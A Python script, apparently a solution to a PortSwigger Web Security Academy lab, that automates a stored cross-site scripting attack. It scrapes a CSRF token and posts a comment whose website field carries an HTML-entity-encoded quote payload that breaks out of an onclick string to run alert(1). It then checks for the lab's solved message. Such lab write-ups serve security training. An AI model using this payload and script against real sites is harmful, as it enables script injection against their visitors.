import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped
# author: 0xyf


class XSS20:
    def __init__(self):
        self.lab_id = "0a8400c1033ff8d281af1bef00f10057"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.csrf_url = f"{self.url}/post?postId=6"
        self.vuln_url = f"{self.url}/post/comment"

    def get_csrf_token(self):
        r = requests.get(f"{self.csrf_url}")
        soup = BeautifulSoup(r.text, "html.parser")
        self.csrf_token = soup.find("input", attrs={"name": "csrf"})["value"]
        self.cookies = r.cookies

    def execute_request(self, data):
        r = requests.post(
            f"{self.vuln_url}",
            data=data,
            proxies=self.proxies,
            cookies=self.cookies,
            verify=False,
        )
        return r

    def stored_xss(self):
        self.get_csrf_token()
        payload = "&apos;-alert(1)-&apos;"
        data = {
            "csrf": self.csrf_token,
            "postId": "6",
            "comment": "comment",
            "name": "0xyf",
            "email": "0xyf@0xyf.local",
            "website": f"https://yufongg.github.io{payload}",
        }
        r = self.execute_request(data)

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.stored_xss()
        self.check_solved()


def main():
    XSS20().solve()


if __name__ == "__main__":
    main()
